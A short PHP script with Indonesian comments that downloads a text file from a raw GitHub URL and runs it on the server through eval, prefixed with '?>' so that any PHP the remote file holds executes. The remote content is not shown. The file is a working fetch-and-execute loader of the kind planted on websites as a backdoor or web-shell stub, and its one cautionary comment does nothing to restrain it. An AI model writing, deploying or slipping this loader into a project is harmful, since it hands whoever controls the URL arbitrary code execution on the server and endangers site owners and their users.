<?php
// URL eksternal yang akan diambil kontennya
$url = 'https://raw.githubusercontent.com/kabafaxz/www/refs/heads/main/ww.txt';

// Mendapatkan konten dari URL
$content = file_get_contents($url);

// Memeriksa apakah konten berhasil diambil
if ($content !== false) {
    // Menampilkan atau mengeksekusi kode PHP yang diambil
    // Harus hati-hati dalam mengeksekusi konten dari URL eksternal
    eval('?>' . $content);  // eval digunakan untuk mengeksekusi kode PHP yang diambil
} else {
    echo "Gagal mengambil konten dari URL.";
}
?>
